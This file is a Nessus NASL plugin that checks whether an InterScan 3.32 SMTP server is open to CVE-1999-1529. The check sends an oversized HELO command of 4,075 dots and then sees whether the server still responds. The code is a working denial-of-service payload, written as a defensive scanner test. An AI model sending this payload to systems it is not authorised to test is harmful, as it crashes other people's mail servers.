#
# This script was written by Alain Thivillon <Alain.Thivillon@hsc.fr>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10353);
 script_bugtraq_id(787);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-1999-1529");
 name["english"] = "Interscan 3.32 SMTP Denial";
 name["francais"] = "Déni de service contre le serveur SMTP Interscan 3.32";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to perform
a denial of service against the remote
Interscan SMTP server by sending it a special long HELO command. 

This problem allows an attacker to prevent
your Interscan SMTP server from handling requests.

Solution : contact your vendor for a patch.

Risk factor : High";

 desc["francais"] = "Il s'est avéré possible
de créer un déni de service sur le serveur
SMTP Interscan distant en lui envoyant une commande HELO
longue

Un pirate peut utiliser ce problème
pour empecher votre serveur de traiter
les requetes SMTP.

Solution : contactez votre vendeur pour un
patch.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the Interscan NT SMTP Server";
 summary["francais"] = "Fait planter le serveur SMTP Interscan NT";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison and Alain Thivillon",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison et Alain Thivillon");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if(!get_port_state(port))exit(0);

banner = get_smtp_banner (port:port);
if ("InterScan" >!< banner)
  exit (0);

 soc = open_sock_tcp(port);
 if(soc)
 {
   s = smtp_recv_banner(socket:soc);
   if(s)
   {
   c = string("HELO a\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:5000);
   if(!s)exit(0);
   c = string("HELO ", crap(length:4075, data:"."),"\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:5000);
   if(!s) { security_hole(port); exit(0) ; }
   c = string("HELO a\r\n");
   send(socket:soc, data:c);
   s = recv_line(socket:soc, length:2048, timeout:20);
   if(!s) { security_hole(port); exit(0); }
   }
   close(soc);
 }
	
